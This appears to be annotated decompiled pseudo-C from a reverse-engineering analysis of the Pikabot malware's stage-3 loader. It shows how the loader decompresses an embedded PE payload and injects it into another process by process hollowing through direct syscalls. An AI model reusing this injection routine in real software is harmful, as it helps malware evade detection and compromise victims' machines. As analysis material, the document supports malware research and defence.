
int pikabot_core;
// 025F3020
int execute_stage3(void)

{
  int var1;
  int var2 = 0;
  int var3;
  int var6;
  int ret;
  int var7;
  int var8 [5];

  ret = 0;
  var7 = 0xc0000;
  do {
    var7 = var7 - var8[ret];
    ret = ret + 1;
  } while (ret != 5);

  int ret = RtlCreateProcessParametersEx(var1,&var2);
  if (ret < 0) {
    return 0;
  }
  short* ptr_stage3 = (short *)pikabot_RtlAllocateHeap(0x100000); // 0306B020

    /*
    NT_RTL_COMPRESS_API NTSTATUS RtlDecompressBuffer(
        [in]  USHORT CompressionFormat,
        [out] PUCHAR UncompressedBuffer,
        [in]  ULONG  UncompressedBufferSize,
        [in]  PUCHAR CompressedBuffer,
        [in]  ULONG  CompressedBufferSize,
        [out] PULONG FinalUncompressedSize
        );
    */
  (**(code **)(pikabot_core + 0x14))
            (0x102,ptr_stage3,0x100000,*(int *)(pikabot_core + 0x4c),
             *(int *)(pikabot_core + 0x50),var3);


  execute_syscall_NOSE(); // id = 19 -> ZwQueryInformationProcess

  int uVar5 = pikabot_RtlAllocateHeap(0x248);
  execute_syscall_0(); // id = 3f -> NtReadVirtualMemory
  RtlFreeHeap(uVar5);

  if (*ptr_stage3 != 0x5a4d) {
    execute_syscall_3(); // id = ? -> NtResumeThread
    return 0;
  }

  ret = *(int *)(ptr_stage3 + 0x1e);
  execute_syscall_4(); // id = 18 -> NtAllocateVirtualMemory

  int ptr = (int *)pikabot_RtlAllocateHeap(*(int *)((int)ptr_stage3 + ret + 0x54)); // ptr = size of headers
  copyContent(ptr,(int *)ptr_stage3,*(int *)((int)ptr_stage3 + ret + 0x54));
  int var4 = execute_syscall_2(); // id = 3a -> NtWriteVirtualMemory

  int var9 = 0;
  if (var4 == 0) {
    RtlFreeHeap(ptr);
    var4 = (int)ptr_stage3 + (uint)*(ushort *)((int)ptr_stage3 + ret + 0x14) + ret + 0x18;

    int var5 = 0;
    do {
      if ((int)(uint)*(ushort *)((int)ptr_stage3 + ret + 6) <= var5) {

        var6 = (uint *)pikabot_RtlAllocateHeap(0x2cc);
        *var6 = var7 | 0x10007;

        execute_syscal_10(); // id = f3 -> NtGetContextThread

        var6[0x2c] = *(int *)((int)ptr_stage3 + ret + 0x28) + var9;
        
        execute_syscall_1(); // id = 18d -> NtSetContextThread
        execute_syscall_2(); // id = 3a -> NtWriteVirtualMemory
        execute_syscall_3(); // NtResumeThread

        RtlFreeHeap(var6);
        return 1;
      }

      uVar5 = pikabot_RtlAllocateHeap(*(undefined4 *)(var4 + 0x10));

      copyContent((undefined *)0x2f2aab4,(undefined *)(*(int *)(var4 + 0x14) + (int)ptr_stage3),
                  *(int *)(var4 + 0x10));

      int iVar7 = execute_syscall_2(); // ->  direct_NtWriteVirtualMemory
      if (iVar7 != 0) {
        break;
      }

      RtlFreeHeap(0x2f2a9c8);
      var4 = var4 + 0x28;
      var5 = var5 + 1;

    } while( true );
  }

  RtlFreeHeap(uVar5);
  RtlFreeHeap(ptr);
  execute_syscall_3();

  return 0;
}
